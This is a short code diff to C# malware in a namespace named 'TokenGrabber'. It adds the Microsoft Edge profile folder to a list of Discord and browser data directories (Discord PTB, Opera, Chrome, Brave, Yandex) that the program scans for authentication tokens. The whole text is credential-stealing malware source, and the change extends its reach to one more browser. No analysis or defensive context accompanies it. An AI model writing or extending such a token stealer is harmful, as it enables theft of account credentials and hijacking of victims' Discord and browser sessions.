@@ -51,6 +51,7 @@ namespace TokenGrabber
                 Path.Combine(roaming, "discordptb"),
                 Path.Combine(roaming, "Opera Software\\Opera Stable"),
                 Path.Combine(local, "Google\\Chrome\\User Data\\Default"),
+                Path.Combine(local, "Microsoft\\Edge\\User Data\\Default"),
                 Path.Combine(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
                 Path.Combine(local, "Yandex\\YandexBrowser\\User Data\\Default")
             };
